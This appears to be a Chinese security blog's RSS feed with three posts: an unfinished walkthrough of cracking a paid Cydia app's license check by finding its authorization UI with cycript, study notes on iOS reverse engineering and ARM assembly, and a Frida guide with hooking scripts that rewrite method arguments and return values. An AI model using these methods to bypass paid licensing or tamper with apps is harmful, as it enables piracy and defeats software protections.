<?xml version="1.0" encoding="UTF-8"?>
<rss version="2.0" xmlns:atom="https://www.w3.org/2005/Atom">
  <channel>
    <title>quanyechavshuo</title>
    <description>A blog about programming and network security</description>
    <link>http://localhost:4000/</link>
    <atom:link href="http://localhost:4000/feed.xml" rel="self" type="application/rss+xml" />
    <pubDate>Tue, 16 Jan 2018 08:16:07 +0800</pubDate>
    <lastBuildDate>Tue, 16 Jan 2018 08:16:07 +0800</lastBuildDate>
    <generator>Jekyll v3.5.2</generator>
    
      <item>
        <title>实战ios破解--通过UI找关键函数</title>
        <description>&lt;h3 id=&quot;0x0-about&quot;&gt;0x0 About&lt;/h3&gt;

&lt;p&gt;本文记录破解一个cydia中收费deb软件过程,如下为一个截图,其中&lt;code class=&quot;highlighter-rouge&quot;&gt;权限&lt;/code&gt;所在UI显示&lt;code class=&quot;highlighter-rouge&quot;&gt;未授权&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/3xp10it/pic/master/crack_deb.png&quot; alt=&quot;权限截图&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;0x1-通过ui找函数的2种方法&quot;&gt;0x1 通过UI找函数的2种方法&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;ios通过cydia安装&lt;code class=&quot;highlighter-rouge&quot;&gt;flex_injected&lt;/code&gt;,并在要破解的软件中使用&lt;code class=&quot;highlighter-rouge&quot;&gt;flex_injected&lt;/code&gt;
这种方法很方便,效率很高,可通过点击app中的&lt;code class=&quot;highlighter-rouge&quot;&gt;flex_injected&lt;/code&gt;功能区的&lt;code class=&quot;highlighter-rouge&quot;&gt;select&lt;/code&gt;,再点击对应UI再点击&lt;code class=&quot;highlighter-rouge&quot;&gt;views&lt;/code&gt;按钮,通过&lt;code class=&quot;highlighter-rouge&quot;&gt;views&lt;/code&gt;中的不同颜色来直接定位对应UI和UI对应的类&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;通过cycript注入要破解的软件,然后通过&lt;code class=&quot;highlighter-rouge&quot;&gt;[#0x... setHidden:YES]&lt;/code&gt;来找到UI后再找函数
这种方法比上面的方法麻烦,需要通过&lt;a href=&quot;https://www.jianshu.com/p/e802b8b76e92&quot;&gt;这里&lt;/a&gt;的命令来查找,一般是通过&lt;code class=&quot;highlighter-rouge&quot;&gt;[[UIApp keyWindow] recursiveDescription]&lt;/code&gt;得到的结果逐个元素进行排除来得到目标UI对象.有以下2点注意事项&lt;/p&gt;
    &lt;ul&gt;
      &lt;li&gt;cycript设置查看ui对应函数时用到的?expand命令失效时可以这样弥补&lt;code class=&quot;highlighter-rouge&quot;&gt;[[UIApp keyWindow] recursiveDescription].toString()&lt;/code&gt;&lt;/li&gt;
      &lt;li&gt;cycript查找ui对应的元素可通过找几个主要的大树枝,如果大树枝&lt;code class=&quot;highlighter-rouge&quot;&gt;[#0x... setHidden:YES]&lt;/code&gt;后发现要找的UI不显示了则说明要找的UI在这个大树枝里面,然后再大树枝里通过&lt;code class=&quot;highlighter-rouge&quot;&gt;[#0x... setHidden:YES]&lt;/code&gt;逐渐找到最终的小树枝.通过cycript找UI这条路一般不用,除非用flex_injected找不到(有些app无法使用flex_injected)&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;0x2-破解过程&quot;&gt;0x2 破解过程&lt;/h3&gt;

&lt;h4 id=&quot;step1-找到ui对应的元素&quot;&gt;step1 找到ui对应的元素&lt;/h4&gt;

&lt;p&gt;本文要破解的app是cydia里安装的,可能有一些反破解机制,导致无法直接使用&lt;code class=&quot;highlighter-rouge&quot;&gt;ida&lt;/code&gt;调试,也无法使用&lt;code class=&quot;highlighter-rouge&quot;&gt;flex_injected&lt;/code&gt;分析ui,于是使用上面的第2种方法,也即通过&lt;code class=&quot;highlighter-rouge&quot;&gt;cycript&lt;/code&gt;注入目标进程来通过排除法查找上图中&lt;code class=&quot;highlighter-rouge&quot;&gt;权限&lt;/code&gt;这个ui对应的函数&lt;/p&gt;

&lt;h4 id=&quot;step2-找到ui元素对应的函数&quot;&gt;step2 找到ui元素对应的函数&lt;/h4&gt;

&lt;h4 id=&quot;step3-ida分析函数&quot;&gt;step3 ida分析函数&lt;/h4&gt;

</description>
        <pubDate>Tue, 16 Jan 2018 00:00:00 +0800</pubDate>
        <link>http://3xp10it.cc/%E4%BA%8C%E8%BF%9B%E5%88%B6/2018/01/16/%E5%AE%9E%E6%88%98ios%E7%A0%B4%E8%A7%A3-%E9%80%9A%E8%BF%87UI%E6%89%BE%E5%85%B3%E9%94%AE%E5%87%BD%E6%95%B0/</link>
        <guid isPermaLink="true">http://localhost:4000/%E4%BA%8C%E8%BF%9B%E5%88%B6/2018/01/16/%E5%AE%9E%E6%88%98ios%E7%A0%B4%E8%A7%A3-%E9%80%9A%E8%BF%87UI%E6%89%BE%E5%85%B3%E9%94%AE%E5%87%BD%E6%95%B0/</guid>
        
        <category>ios</category>
        
        <category>UI</category>
        
        <category>cycript</category>
        
        
        <category>二进制</category>
        
      </item>
    
      <item>
        <title>ios应用逆向工程5-6章笔记</title>
        <description>&lt;h3 id=&quot;理论篇&quot;&gt;理论篇&lt;/h3&gt;

&lt;p&gt;1.依据维基百科的定义,tweak指的是对电子系统进行轻微调整来增强其功能的工具;在iOS中,tweak特指那些能够增强基他进程功能的dylib,是越狱iOS的最重要组成部分.这种增强原有工具功能的方法是通过&lt;code class=&quot;highlighter-rouge&quot;&gt;进程注入&lt;/code&gt;实现的,就像书籍的知识注入大脑的,让大脑变得更强&lt;/p&gt;

&lt;p&gt;2.一般来说,编写tweak会用到C,C++和Objective-C三种语言&lt;/p&gt;

&lt;p&gt;3.iOS是个封闭的系统,它暴露给我们的中是冰山一角,有太多太多的功能还有待我们进一步挖掘.每次越狱发布后,都会有人把最新的头文件发布出来,google一下&lt;code class=&quot;highlighter-rouge&quot;&gt;iOS private headers&lt;/code&gt;即可轻松找到下载链接,省去了自己class-dump的麻烦&lt;/p&gt;

&lt;p&gt;4.定位目标文件&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;固定位置
  我们的逆向目标一般是dylib,bundle或daemon,它们在系统中的位置几乎是固定的:
    &lt;ul&gt;
      &lt;li&gt;基于CydiaSubstrate的dylib全部位于&lt;code class=&quot;highlighter-rouge&quot;&gt;/Library/MobileSubstrate/DynamicLibraries/&lt;/code&gt;下,几乎不费吹灰之力就可以轻松定位&lt;/li&gt;
      &lt;li&gt;bundle主要分为App和framework两类,其中Appstore App全部位于&lt;code class=&quot;highlighter-rouge&quot;&gt;/var/mobile/Containers/Bundle/Application&lt;/code&gt;下,系统App全部位于&lt;code class=&quot;highlighter-rouge&quot;&gt;/Applications&lt;/code&gt;下,framework全部位于&lt;code class=&quot;highlighter-rouge&quot;&gt;/System/Library/Frameworks&lt;/code&gt;或&lt;code class=&quot;highlighter-rouge&quot;&gt;/System/Library/PrivateFrameworks&lt;/code&gt;下&lt;/li&gt;
      &lt;li&gt;daemon的配置文件均位于&lt;code class=&quot;highlighter-rouge&quot;&gt;/System/Library/LaunchDaemons/&lt;/code&gt;,&lt;code class=&quot;highlighter-rouge&quot;&gt;/Library/LaunchDaemons&lt;/code&gt;或&lt;code class=&quot;highlighter-rouge&quot;&gt;/Library/LaunchAgents/&lt;/code&gt;下,是一个plist格式的文件.其中的&lt;code class=&quot;highlighter-rouge&quot;&gt;ProgramArguments&lt;/code&gt;字段,即是daemon可执行文件的绝对路径&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;cydia
  通过&lt;code class=&quot;highlighter-rouge&quot;&gt;dpkg -i&lt;/code&gt;安装的的deb包,内容会被cydia如实记录,可在cydia中的&lt;code class=&quot;highlighter-rouge&quot;&gt;Filesystem Content&lt;/code&gt;中找到路径&lt;/li&gt;
  &lt;li&gt;PreferenceBundle
  PreferenceBundle是寄生在Settings应用里的App,它的功能界定有些模糊,既可以作为单纯的配置文件,由别的进程读取后执行,也可以估计有实际功能,自己来执行一些操作.来自AppStore的第三方PreferenceBundle仅可作为配置文件存在,不会含有实际功能;来自Cydia的也不是问题,可通过上面的定位方式找到路径;但对于iOS自带的PreferenceBundle来说,定位的过程就要复杂一些.PreferenceBundle的界面可以用代码编写,也可以用固定格式的plist文件构造.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;5.使用&lt;code class=&quot;highlighter-rouge&quot;&gt;cycript&lt;/code&gt;可快速测试函数功能,比theos方便&lt;/p&gt;

&lt;p&gt;6.解析函数参数&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;getClassName&lt;/code&gt;函数能够把对象的类名表示成一个&lt;code class=&quot;highlighter-rouge&quot;&gt;char*&lt;/code&gt;,如&lt;code class=&quot;highlighter-rouge&quot;&gt;object_getClassName(arg1)&lt;/code&gt;获取arg1这个对象的的对象类名&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;description&lt;/code&gt;函数能够把对象的内容表示成一个NSString,如&lt;code class=&quot;highlighter-rouge&quot;&gt;[arg1 description]&lt;/code&gt;获取arg1这个对象的对象内容&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;%hook SBScreenFlash
- (void)flashColor:(id)arg1 withCompletion:(id)arg2
{
    %orig;
    NSLog(@&quot;iOSRE: flashColor: %s, %@&quot;, object_getClassName(arg1),arg1);//[arg1 description]可以直接写成arg1
}
end
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;上面的示例中打印的结果为&lt;code class=&quot;highlighter-rouge&quot;&gt;iOSRE: flashColor: UICachedDeviceWhiteColor, UIDeviceWhiteColorSpace 1 1&lt;/code&gt;,其中&lt;code class=&quot;highlighter-rouge&quot;&gt;UICachedDeviceWhiteColor&lt;/code&gt;是对象类名,&lt;code class=&quot;highlighter-rouge&quot;&gt;UIDeviceWhiteColorSpace 1 1&lt;/code&gt;是对象内容&lt;/p&gt;

&lt;p&gt;7.书籍作者强烈建议大家通览class-dump出的头文件,把那些语义明显,自己感兴趣的函数放到iOS上实测一下,这个过程能极大地增加对iOS底层的熟悉程度&lt;/p&gt;

&lt;p&gt;8.ARM处理器中的特殊用途的寄存器&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;R0-R3     传递参数与返回值&lt;/li&gt;
  &lt;li&gt;R7        帧指针,指向母函数与被调用子函数在栈中的交界(相当于ebp?)&lt;/li&gt;
  &lt;li&gt;R9        在ios3.0以前被系统保留&lt;/li&gt;
  &lt;li&gt;R12       内部过程调用寄存器,dynamic linker会用到它&lt;/li&gt;
  &lt;li&gt;R13       SP寄存器(相当于esp?)&lt;/li&gt;
  &lt;li&gt;R14       LR寄存器,保存函数返回地址(居然有一个单独的寄存器用来保存函数返回地址)&lt;/li&gt;
  &lt;li&gt;R15       PC寄存器(相当于eip?)&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;9.ARM调用规则
在执行一块代码时,其前后栈地址应该是不变的.这个操作是通过被执行代码块的前言和后记完成的.&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;前言
    &lt;ul&gt;
      &lt;li&gt;将LR入栈&lt;/li&gt;
      &lt;li&gt;将R7入栈(push ebp)&lt;/li&gt;
      &lt;li&gt;R7=SP&lt;/li&gt;
      &lt;li&gt;将需要保留的寄存器原始值入栈&lt;/li&gt;
      &lt;li&gt;为本地变量开辟空间&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;后记
    &lt;ul&gt;
      &lt;li&gt;释放本地变量占用的空间&lt;/li&gt;
      &lt;li&gt;将需要保留的原始值出栈&lt;/li&gt;
      &lt;li&gt;将R7出栈&lt;/li&gt;
      &lt;li&gt;将LR出栈,PC=LR&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;10.函数调用时,函数的前4个参数存放在R0到R3中,其他参数存放在栈中;返回值放在R0中&lt;/p&gt;

&lt;p&gt;11.ARM处理器用到的指令集分为ARM和THUMB两种;ARM指令长度均为32bit,THUMB指令长度均为16bit.THUMB指令比ARM指令更节省空间,且在16位数据总线上的传输效率更高,相对于ARM指令,THUMB指令的缺点如下&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;指令数量减少&lt;/li&gt;
  &lt;li&gt;没有条件执行&lt;/li&gt;
  &lt;li&gt;所有指令默认附带”s”&lt;/li&gt;
  &lt;li&gt;桶式移位无法结合其他指令执行&lt;/li&gt;
  &lt;li&gt;寄存器使用受限&lt;/li&gt;
  &lt;li&gt;立即数和第二操作数使用受限&lt;/li&gt;
  &lt;li&gt;不支持数据写回&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;12.ARM处理器的所有指令可大致分为3类,分别是&lt;code class=&quot;highlighter-rouge&quot;&gt;数据操作指令&lt;/code&gt;,&lt;code class=&quot;highlighter-rouge&quot;&gt;内存操作指令&lt;/code&gt;和&lt;code class=&quot;highlighter-rouge&quot;&gt;分支指令&lt;/code&gt;&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;数据操作指令
所有操作数均为32位,所有的结果均为32位,且只能存放在寄存器中
    &lt;ul&gt;
      &lt;li&gt;算术操作
        &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  ADD R0,R1,R2        ;R0=R1+R2
  ADC R0,R1,R2        ;R0=R1+R2+C(arry)
  SUB R0,R1,R2        ;R0=R1-R2
  SBC R0,R1,R2        ;R0=R1-R2-!C
  RSB R0,R1,R2        ;R0=R2-R1
  RSC R0,R1,R2        ;R0=R2-R1-!C
  以&quot;C&quot;(即Carry)结尾的变种代表有进位和借位的加减法,当产生进位或没有借位时,将Carry flag置1
&lt;/code&gt;&lt;/pre&gt;
        &lt;/div&gt;
      &lt;/li&gt;
      &lt;li&gt;逻辑操作
        &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  AND R0,R1,R2        ;R0=R1&amp;amp;R2
  ORR R0,R1,R2        ;R0=R1|R2
  EOR R0,R1,R2        ;R0=R1^R2
  BIC R0,R1,R2        ;R0=R1&amp;amp;~R2
  MOV R0,R2           ;R0=R2
  MVN R0,R2           ;R0=~R2
&lt;/code&gt;&lt;/pre&gt;
        &lt;/div&gt;
      &lt;/li&gt;
      &lt;li&gt;比较操作
        &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  CMP R1,R2           ;执行R1-R2并依据结果设置flag
  CMN R1,R2           ;执行R1+R2并依据结果设置flag
  TST R1,R2           ;执行R1&amp;amp;R2并依据结果设置flag
  TEQ R1,R2           ;执行R1^R2并依据结果设置flag
&lt;/code&gt;&lt;/pre&gt;
        &lt;/div&gt;
      &lt;/li&gt;
      &lt;li&gt;乘法操作
        &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  MUL R4,R3,R2        ;R4=R3*R2
  MLA R4,R3,R2,R1     ;R4=R3*R2+R1
&lt;/code&gt;&lt;/pre&gt;
        &lt;/div&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;内存操作指令
ARM内存操作只有2个基础指令,&lt;code class=&quot;highlighter-rouge&quot;&gt;LDR&lt;/code&gt;(load register)将内存中的数据存到寄存器(cpu),&lt;code class=&quot;highlighter-rouge&quot;&gt;STR&lt;/code&gt;(store register)将寄存器(cpu)中的数据保存到内存.除了LDR和STR外,还可以通过&lt;code class=&quot;highlighter-rouge&quot;&gt;LDM(load multiple)&lt;/code&gt;和&lt;code class=&quot;highlighter-rouge&quot;&gt;STM(store multiple)&lt;/code&gt;进行块传输,一次性操作多个寄存器.需要特别注意的是,LDM和STM的操作方向与LDR和STR完全相反:LDM是把从Rd开始,地址连续的内存数据存入reglist中,STM是把reglist中的值存入从Rd开始,地址连续的内存中.
    &lt;ul&gt;
      &lt;li&gt;LDR
        &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  LDR Rt,[Rn{,#offset}]       ;Rt=*(Rn{+offset}),{}代表可选
  LDR Rt,[Rn,#offset]!        ;Rt=*(Rn+offset);Rn=Rn+offset
  LDR Rt,[Rn,#offset]         ;Rt=*Rn;Rn=Rn+offset
&lt;/code&gt;&lt;/pre&gt;
        &lt;/div&gt;
      &lt;/li&gt;
      &lt;li&gt;STR
        &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  STR Rt,[Rn{,#offset}]       ;*(Rn{+offset})=Rt
  STR Rt,[Rn,#offset]!        ;*(Rn{+offset})=Rt;Rn=Rn+offset
  STR Rt,[Rn],#offset         ;*Rn=Rt;Rn=Rn+offset
&lt;/code&gt;&lt;/pre&gt;
        &lt;/div&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;分支指令
    &lt;ul&gt;
      &lt;li&gt;无条件分支
        &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  B label             ;PC=label
  BL label            ;LR=PC-4;PC=label
  BX Rd               ;PC=Rd并切换指令集
&lt;/code&gt;&lt;/pre&gt;
        &lt;/div&gt;
      &lt;/li&gt;
      &lt;li&gt;条件分支
        &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  EQ                  ;Z=1
  NE                  ;Z=0
  CS                  ;C=1
  HS                  ;C=1
  CC                  ;C=0
  LO                  ;C=0
  MI                  ;N=1
  PL                  ;N=0
  VS                  ;V=1
  VC                  ;V=0
  HI                  ;C=1 &amp;amp; Z=0
  LS                  ;C=0 | Z=1
  GE                  ;N=V
  LT                  ;N!=V
  GT                  ;Z=0 &amp;amp; n=V
  LE                  ;Z=1 | N!=V
&lt;/code&gt;&lt;/pre&gt;
        &lt;/div&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

</description>
        <pubDate>Wed, 10 Jan 2018 00:00:00 +0800</pubDate>
        <link>http://3xp10it.cc/%E4%BA%8C%E8%BF%9B%E5%88%B6/2018/01/10/ios%E5%BA%94%E7%94%A8%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B5-6%E7%AB%A0%E7%AC%94%E8%AE%B0/</link>
        <guid isPermaLink="true">http://localhost:4000/%E4%BA%8C%E8%BF%9B%E5%88%B6/2018/01/10/ios%E5%BA%94%E7%94%A8%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B5-6%E7%AB%A0%E7%AC%94%E8%AE%B0/</guid>
        
        <category>ios</category>
        
        <category>reverse</category>
        
        
        <category>二进制</category>
        
      </item>
    
      <item>
        <title>frida用法</title>
        <description>&lt;h3 id=&quot;0x0-about&quot;&gt;0x0 About&lt;/h3&gt;

&lt;p&gt;记录适用于ios的objective-c的类中函数的frida的用法&lt;/p&gt;

&lt;h3 id=&quot;0x1-必读&quot;&gt;0x1 必读&lt;/h3&gt;

&lt;p&gt;&lt;a href=&quot;https://www.frida.re/docs/home/&quot;&gt;官方文档&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://www.frida.re/docs/javascript-api/&quot;&gt;API&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;http://www.voidcn.com/article/p-cuytgsnz-w.html&quot;&gt;官方文档部分翻译&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://www.anquanke.com/post/id/85758&quot;&gt;利用FRIDA攻击Android应用程序1&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://www.anquanke.com/post/id/85759&quot;&gt;利用FRIDA攻击Android应用程序2&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;http://www.freebuf.com/articles/web/125260.html&quot;&gt;如何在iOS应用程序中用Frida来绕过”越狱检测”&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;http://www.freebuf.com/articles/web/125260.html&quot;&gt;使用Frida配合Burp Suite追踪API调用&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;http://www.freebuf.com/sectool/142928.html&quot;&gt;利用Frida从TeamViewer内存中提取密码&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;http://www.freebuf.com/sectool/143360.html&quot;&gt;Brida:使用Frida进行移动应用渗透测试&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://www.anquanke.com/post/id/86567&quot;&gt;联合Frida和BurpSuite的强大扩展–Brida&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://zhuanlan.zhihu.com/p/24020686&quot;&gt;Object-C测试工具与Frida&lt;/a&gt;&lt;/p&gt;

&lt;h3 id=&quot;0x2-安装&quot;&gt;0x2 安装&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;pip3 install frida
或
从这里下载 https://build.frida.re/frida/
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h3 id=&quot;0x3-frida的常见用法&quot;&gt;0x3 frida的常见用法&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;0xa hook函数(ios中theos具备的功能)&lt;/li&gt;
  &lt;li&gt;0xb 记录函数执行日志(ios中theos具备的功能)&lt;/li&gt;
  &lt;li&gt;0xc 调用函数(ios中&lt;a href=&quot;http://www.cycript.org/&quot;&gt;cycript&lt;/a&gt;具备的功能)&lt;/li&gt;
  &lt;li&gt;0xd 读写内存(类似于调试器的功能)&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;使用frida有两种方法&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;命令行[实现简单功能推荐]:
  &lt;code class=&quot;highlighter-rouge&quot;&gt;frida -U -p pid -l xxx.js&lt;/code&gt;&lt;/li&gt;
  &lt;li&gt;api调用[实现复杂功能推荐]:
  例如使用python调用frida的python api来写python脚本实现相应功能,使用python调用api时,推荐阅读api实现细节&lt;a href=&quot;https://github.com/frida/frida-python/blob/master/src/frida/core.py&quot;&gt;frida/core.py&lt;/a&gt;,&lt;a href=&quot;https://github.com/frida/frida-python/blob/master/src/frida/tracer.py&quot;&gt;frida/tracer.py&lt;/a&gt;.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;上面的4种用法可能会涉及到如下js&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://github.com/3xp10it/mytools/blob/master/classes.js&quot;&gt;classes.js&lt;/a&gt;&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;for (var className in ObjC.classes)
    {
        if (ObjC.classes.hasOwnProperty(className))
        {
            console.log(className);
        }
}
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;&lt;a href=&quot;https://github.com/3xp10it/mytools/blob/master/methodsofclass.js&quot;&gt;methodofclass.js&lt;/a&gt;&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;console.log(&quot;[*] Started: Find All Methods of a Specific Class&quot;);
if (ObjC.available)
{
    try
    {
        var className = &quot;xxx&quot;;
        var methods = eval('ObjC.classes.' + className + '.$methods');
        for (var i = 0; i &amp;lt; methods.length; i++)
        {
            try
            {
                console.log(&quot;[-] &quot;+methods[i]);
            }
            catch(err)
            {
                console.log(&quot;[!] Exception1: &quot; + err.message);
            }
        }
    }
    catch(err)
    {
        console.log(&quot;[!] Exception2: &quot; + err.message);
    }
}
else
{
    console.log(&quot;Objective-C Runtime is not available!&quot;);
}
console.log(&quot;[*] Completed: Find All Methods of a Specific Class&quot;);
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;&lt;a href=&quot;https://github.com/3xp10it/mytools/blob/master/record.js&quot;&gt;record.js&lt;/a&gt;&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;if (ObjC.available)
{
    try
    {
        var className = &quot;xxx&quot;;
        var funcName = &quot;- xxx&quot;;
        var hook = eval('ObjC.classes.' + className + '[&quot;' + funcName + '&quot;]');
        console.log(&quot;[*] Class Name: &quot; + className);
        console.log(&quot;[*] Method Name: &quot; + funcName);
        Interceptor.attach(hook.implementation, {
          onEnter: function(args) {
            //注意:有时args参数值在这里会是一个对象,如果函数返回值是字符串类型,为了更好理解则要这样写
            //这里假设args[2]是要记录的参数
            //ObjC.classes.NSString.stringWithString_(args[2])或者args[2].toString()或者ObjC.classes.NSString.stringWithString_(args[2]).toString()
            //具体情况需要测试下是上面这3种的哪种写法
            console.log(&quot;param:&quot;+args[2]+&quot; type:&quot;+typeof args[2]);
          },
          onLeave: function(retval) {
            //注意:retval一般会返回一个对象,如果函数返回值是字符串类型,为了更好理解则要这样写
            //ObjC.classes.NSString.stringWithString_(retval)或者retval.toString()或者ObjC.classes.NSString.stringWithString_(retval).toString()
            //具体情况需要测试下是上面这3种的哪种写法
            console.log(&quot;Return value-&amp;gt; (type:&quot;+typeof retval+&quot;,value:&quot;+retval+&quot;)&quot;);
          }
        });
    }
    catch(err)
    {
        console.log(&quot;[!] Exception2: &quot; + err.message);
    }
}
else
{
    console.log(&quot;Objective-C Runtime is not available!&quot;);
}


&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;&lt;a href=&quot;https://github.com/3xp10it/mytools/blob/master/overwrite.js&quot;&gt;overwrite.js&lt;/a&gt;&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;if (ObjC.available)
{
    try
    {
        var className = &quot;PARSPedometerInfo&quot;;
        var funcName = &quot;- integratedSteps&quot;;
        var hook = eval('ObjC.classes.' + className + '[&quot;' + funcName + '&quot;]');
        Interceptor.attach(hook.implementation, {
          onEnter: function(args) {
            console.log(&quot;Original args0-&amp;gt; (type:&quot;+typeof args[0]+&quot;,value:&quot;+args[0]+&quot;)&quot;);
            newargs0=ptr('xxx')
            args[0]=newargs0
            console.log(&quot;New args0-&amp;gt; (type:&quot;+typeof args[0]+&quot;,value:&quot;+args[0]+&quot;)&quot;);
          },
          onLeave: function(retval) {
            //注意:retval永远是一个对象,如果函数返回值是字符串类型,为了更好理解则要这样写
            //string_value=ObjC.classes.NSString.stringWithString_(retval)
            //console.log(&quot;Original return value-&amp;gt; (type:&quot;+typeof string_value+&quot;,value:&quot;+string_value+&quot;)&quot;);
            //newretval=ObjC.classes.NSString.stringWithString_(&quot;xxxx&quot;)
            //retval.replace(newretval)
            //console.log(&quot;New return value-&amp;gt; (type:&quot;+typeof newretval+&quot;,value:&quot;+newretval+&quot;)&quot;);

            console.log(&quot;Origin return value-&amp;gt; (type:&quot;+typeof retval&quot;,value:&quot;+retval+&quot;)&quot;);
            newretval=ptr(&quot;xxxx&quot;)
            retval.replace(newretval)
            console.log(&quot;New return value-&amp;gt; (type:&quot;+typeof newretval&quot;,value:&quot;+newretval+&quot;)&quot;);
          }
        });
    }
    catch(err)
    {
        console.log(&quot;[!] Exception2: &quot; + err.message);
    }
}
else
{
    console.log(&quot;Objective-C Runtime is not available!&quot;);
}

&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h4 id=&quot;0xa-hook函数&quot;&gt;0xa hook函数&lt;/h4&gt;

&lt;p&gt;frida的hook函数功能在ios逆向中相当于theos的hook函数时修改函数的功能(theos相当于打补丁),但是比theos更方便,不用打包成deb安装,缺点是hook函数的语法没有theos简单.hook函数可通过命令行实现(可通过js热切换功能),也可通过其他语言调用frida的api来实现,通过其他语言(如python)调用api来实现时可做到更加”自动化”.在hook函数前要先找到要hook的函数名,可以通过frida枚举类中所有方法来查找或是通过ida反汇编后查看&lt;code class=&quot;highlighter-rouge&quot;&gt;functions窗口&lt;/code&gt;得到,其中&lt;strong&gt;通过frida得到的类中的函数名比通过ida得到的类中的函数名更全&lt;/strong&gt;,因为frida会得到父类的函数,而ida的functions窗口看不到父类的函数名,如果只看ida中类的函数则会错失很多从父类继承的函数名.为了hook一个类中的函数,首先要找到这个类名和函数名,一般找类名是通过ida来分析得出,找到类名后再找未知的函数名时建议通过frida查找(这里是指静态分析时根据函数名猜测实现的对应功能,如果是动态调试则不用根据函数名来猜测对应功能).&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;找类&lt;code class=&quot;highlighter-rouge&quot;&gt;frida -U -p pid -l classes.js&lt;/code&gt;&lt;/li&gt;
  &lt;li&gt;找类函数&lt;code class=&quot;highlighter-rouge&quot;&gt;frida -U -p pid -l methodofclass.js&lt;/code&gt;&lt;/li&gt;
  &lt;li&gt;hook函数&lt;code class=&quot;highlighter-rouge&quot;&gt;frida -U -p pid -l overwrite.js&lt;/code&gt;,也可通过python api如下实现,其中js通过&lt;code class=&quot;highlighter-rouge&quot;&gt;send()&lt;/code&gt;传递内容到python中&lt;/li&gt;
&lt;/ul&gt;

